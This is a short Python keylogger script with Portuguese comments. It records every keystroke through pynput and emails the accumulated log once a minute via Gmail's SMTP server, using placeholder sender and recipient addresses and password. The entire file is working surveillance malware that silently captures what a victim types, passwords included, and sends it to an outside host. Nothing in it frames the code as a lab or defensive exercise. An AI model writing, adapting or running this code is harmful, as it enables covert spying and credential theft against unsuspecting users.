from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações
email_origem = "email"
email_destino = "email"
senha_email = "senha"

log = " "
def enviar_email():
	global log
	if log:
		msg = MIMEText(log)
		msg['SUBJECT'] = "Dados capturados pelo keylogger"
		msg['From'] = email_origem
		msg['To'] = email_destino
		try:
			server = smtplib.SMTP("smtp.gmail.com", 587)
			server.starttls()
			server.login(email_origem, senha_email)
			server.send_message(msg)
			server.quit()
		except Exception as e:
			print("Erro ao enviar", e)

		log = ""

	# Envia email a cada 1 minuto
	Timer(60, enviar_email).start()

def on_press(key):
	global log
	try:
		log += key.char
	except AttributeError:
		if key == keyboard.Key.space:
			log += " "
		elif key == keyboard.Key.enter:
			log += "\n"
		elif key == keyboard.Key.backspace:
			log += "[<]"
		else:
			pass

# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
	enviar_email()
	listener.join()
